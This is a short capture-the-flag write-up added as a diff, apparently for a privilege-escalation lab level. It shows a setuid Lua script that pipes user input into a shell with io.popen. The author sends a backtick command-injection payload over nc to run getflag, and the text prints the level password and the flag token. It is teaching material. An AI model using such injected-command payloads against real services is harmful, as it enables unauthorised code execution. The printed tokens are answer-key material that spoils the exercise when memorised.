@@ -1,0 +1,19 @@
+feulo4b72j7edeahuete3no7c
+
+<- cat level11.lua
+-> ...
+-> 	prog = io.popen("echo "..pass.." | sha1sum", "r")
+-> ...
+
+Call of echo. Just it. To be certain:
+
+<- ls -l level11.lua
+-> -rwsr-sr-x 1 flag11 level11 668 Mar  5  2016 level11.lua
+
+Well go for it:
+
+<- nc localhost 5151
+<- `getflag > /tmp/popipo`
+
+<- cat /tmp/popipo
+-> Check flag.Here is your token : fa6v5ateaw21peobuub8ipe6s
